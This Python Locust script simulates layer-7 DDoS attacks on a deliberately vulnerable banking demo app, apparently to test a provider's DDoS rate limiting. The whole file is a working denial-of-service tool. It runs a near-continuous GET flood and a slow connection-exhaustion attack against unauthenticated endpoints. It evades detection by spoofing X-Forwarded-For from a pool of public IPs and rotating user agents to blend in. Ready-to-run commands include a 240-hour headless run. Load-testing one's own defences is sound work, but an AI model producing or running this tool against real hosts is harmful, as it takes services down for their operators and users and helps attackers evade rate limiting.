"""
vuln-bank L7 DDoS Traffic Simulator
=====================================
Simulates two types of L7 DDoS attacks against non-authenticated endpoints.

Workflow 1 - L7FloodUser  : Rapid-fire GET flood — exhausts server capacity
                             and triggers XC L7 DDoS rate limiting
Workflow 2 - SlowL7User   : Slow HTTP attack — opens many concurrent connections
                             with streaming reads to exhaust server worker threads

Target endpoints (all non-authenticated):
  - GET /                    Homepage — highest real-world attack surface
  - GET /api/docs            Swagger UI — CPU-intensive schema rendering
  - GET /api/bill-categories Public API with DB query

Run examples:
  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --users 100 --spawn-rate 10
  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 100 --spawn-rate 10 --run-time 240h
  locust -f locust-ddos.py --host=https://vulnbank.yourdomain.com --headless --users 100 --spawn-rate 10
"""

import random

from locust import HttpUser, constant, between, task
from locust.exception import StopUser

# ──────────────────────────────────────────────────────────────
# Spoofed identity pools
# ──────────────────────────────────────────────────────────────

PUBLIC_IPS = [
    # North America
    "12.34.56.78",   "23.45.67.89",   "34.56.78.90",   "45.67.89.01",
    "56.78.90.12",   "67.89.01.23",   "98.12.34.56",   "104.23.45.67",
    "108.34.56.78",  "172.56.78.90",  "184.67.89.01",  "199.78.90.12",
    # Europe
    "2.67.89.01",    "5.78.90.12",    "31.89.01.23",   "37.90.12.34",
    "46.01.23.45",   "62.12.34.56",   "77.23.45.67",   "80.34.56.78",
    "82.45.67.89",   "83.56.78.90",   "85.78.90.12",   "91.34.56.78",
    # Asia Pacific
    "1.67.89.01",    "14.78.90.12",   "27.89.01.23",   "36.90.12.34",
    "58.45.67.89",   "101.89.01.23",  "110.12.34.56",  "112.34.56.78",
    # South America
    "177.67.89.01",  "179.78.90.12",  "186.90.12.34",  "191.34.56.78",
]

USER_AGENTS = [
    # Legitimate-looking (blend into real traffic)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Tool-like (common in real DDoS traffic)
    "curl/7.85.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# Target endpoints — all non-authenticated
TARGETS = [
    "/",
    "/api/docs",
    "/api/bill-categories",
]


def pick_identity() -> tuple:
    return random.choice(PUBLIC_IPS), random.choice(USER_AGENTS)


# ──────────────────────────────────────────────────────────────
# Workflow 1 – L7 Flood (Volumetric)
# Fires requests as fast as possible with no wait time.
# Goal: exhaust server capacity, trigger XC L7 DDoS rate limiting.
# ──────────────────────────────────────────────────────────────

class L7FloodUser(HttpUser):
    """
    Rapid-fire GET flood against all 3 target endpoints.
    No wait time — designed to maximize RPS and trigger XC DDoS blocks.
    """

    wait_time = constant(0.1)

    def on_start(self):
        ip, ua = pick_identity()
        self.client.headers.update({
            "X-Forwarded-For": ip,
            "User-Agent":      ua,
            "Accept":          "text/html,application/json,*/*",
        })

    @task(3)
    def flood_homepage(self):
        self.client.get(
            "/",
            name="[DDoS Flood] Homepage",
            catch_response=True,
        ).close()

    @task(3)
    def flood_api_docs(self):
        self.client.get(
            "/api/docs",
            name="[DDoS Flood] Swagger Docs",
            catch_response=True,
        ).close()

    @task(3)
    def flood_bill_categories(self):
        self.client.get(
            "/api/bill-categories",
            name="[DDoS Flood] Bill Categories API",
            catch_response=True,
        ).close()


# ──────────────────────────────────────────────────────────────
# Workflow 2 – Slow L7 Attack
# Opens many concurrent connections with streaming responses.
# Goal: exhaust server worker threads without generating high RPS.
# ──────────────────────────────────────────────────────────────

class SlowL7User(HttpUser):
    """
    Slow L7 attack — many concurrent connections with a long timeout.
    Does not use stream=True (incompatible with gevent + HTTPS).
    Connection exhaustion is achieved through high concurrency + slow wait,
    keeping server worker threads occupied without flooding RPS.
    """

    wait_time = between(1, 3)

    def on_start(self):
        ip, ua = pick_identity()
        self.client.headers.update({
            "X-Forwarded-For": ip,
            "User-Agent":      ua,
            "Accept-Encoding": "identity",
            "Accept":          "text/html,application/json,*/*",
            "Connection":      "keep-alive",
        })

    def _slow_get(self, path: str, name: str):
        try:
            self.client.get(
                path,
                name=name,
                catch_response=True,
                timeout=30,
            ).close()
        except Exception:
            pass

    @task(2)
    def slow_homepage(self):
        self._slow_get("/", "[Slow DDoS] Homepage")

    @task(2)
    def slow_api_docs(self):
        self._slow_get("/api/docs", "[Slow DDoS] Swagger Docs")

    @task(2)
    def slow_bill_categories(self):
        self._slow_get("/api/bill-categories", "[Slow DDoS] Bill Categories API")
